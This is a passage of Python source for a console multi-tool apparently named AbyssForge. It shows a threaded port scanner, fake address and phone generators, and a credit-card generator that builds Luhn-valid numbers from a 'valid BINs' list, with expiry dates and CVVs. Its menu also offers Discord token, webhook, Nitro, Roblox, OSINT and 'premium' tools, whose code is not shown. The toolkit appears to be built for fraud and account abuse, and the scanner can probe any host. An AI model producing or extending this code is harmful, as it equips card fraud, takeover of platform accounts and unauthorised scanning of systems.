        pbar.update(1)
    return None
def port_scanner():
    try:
        target = safe_input(" Target: ")
        if not target: return
        ip = socket.gethostbyname(target)
        print(Fore.GREEN + f"[+] Resolved: {target} → {ip}")
    except:
        print(Fore.RED + "[-] Host not found")
        return
    mode = safe_int(" 1=Common, 2=Range: ", 1, 2)
    ports = COMMON_PORTS if mode == 1 else list(range(safe_int(" Start: ",1,65535), safe_int(" End: ",1,65535)+1))
    if len(ports) > 5000 and safe_input(" [!] Large scan. Continue? (y/n): ").lower() != 'y': return
    print(Fore.CYAN + f"[+] Scanning {len(ports)} ports...\n")
    open_ports = []
    with tqdm(total=len(ports), desc="Scanning", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(scan_single_port, ip, port, pbar) for port in ports]
            for future in as_completed(futures):
                result = future.result()
                if result: open_ports.append(result)
    print(Fore.CYAN + f"\n[+] Open: {', '.join(map(str,sorted(open_ports)))}" if open_ports else Fore.YELLOW + "\n[!] No open ports")
    input(Fore.YELLOW + "\n [Enter]")
# ================== FAKE INFO HELPERS ==================
def generate_address(country):
    if country == "US":
        city_idx = random.randint(0, len(CITIES_US) - 1)
        return f"{random.randint(1,999)} Main St, {CITIES_US[city_idx]}, {STATES_US[city_idx]} {random.randint(10000,99999)}"
    return "123 Main St, City, ST 12345"
def generate_phone(country):
    if country == "US": return f"({random.randint(200,999)}) {random.randint(200,999)}-{random.randint(1000,9999)}"
    return "(555) 123-4567"
def generate_credit_card():
    bin_p = random.choice(CC_VALID_BINS)
    acc = ''.join(random.choices(string.digits, k=9))
    num = bin_p + acc
    digits = [int(d) for d in num]
    for i in range(len(digits)-2, -1, -2): digits[i] = digits[i]*2 if digits[i]*2 <= 9 else digits[i]*2 - 9
    check = (10 - sum(digits) % 10) % 10
    full = num + str(check)
    return f"{full[:4]} {full[4:8]} {full[8:12]} {full[12:]}", f"{random.randint(1,12):02d}/{random.randint(25,30)}", random.randint(100,999)
# ================== MAIN MENU (FULLY FIXED) ==================
def main_menu():
    while True:
        try:
            print_banner()
            print(Fore.CYAN + "[1] Discord Token Tools")
            print(Fore.CYAN + "[2] Discord Bot Tools")
            print(Fore.CYAN + "[3] Webhook Tools")
            print(Fore.CYAN + "[4] Server & Nitro Tools")
            print(Fore.CYAN + "[5] Roblox Tools")
            print(Fore.CYAN + "[6] OSINT Tools")
            print(Fore.CYAN + "[7] Domain Security")
            print(Fore.CYAN + "[8] Fake Info & CC Generator")
            print(Fore.CYAN + "[9] Security Tools")
            print(Fore.CYAN + "[10] Premium Tools")
            print(Fore.CYAN + "[0] Exit")
            print(Fore.WHITE + "=" * 95)
            choice = safe_int(" > ", 0, 10)
            if choice == 0:
                print(Fore.YELLOW + "\nAbyssForge closed.")
                break
            elif choice == 1: discord_token_menu()
            elif choice == 2: discord_bot_menu()
            elif choice == 3: webhook_menu()
            elif choice == 4: server_nitro_menu()
            elif choice == 5: roblox_menu()
            elif choice == 6: osint_menu()
            elif choice == 7: domain_sec_menu()
            elif choice == 8: fake_info_menu()
            elif choice == 9: security_menu()
            elif choice == 10: premium_menu()
        except Exception as e:
            log_critical(f"main_menu crash: {e}\n{traceback.format_exc()}")
            print(Fore.RED + "[!] Critical error. Restarting menu...")
            time.sleep(2)
if __name__ == "__main__":
    main_menu()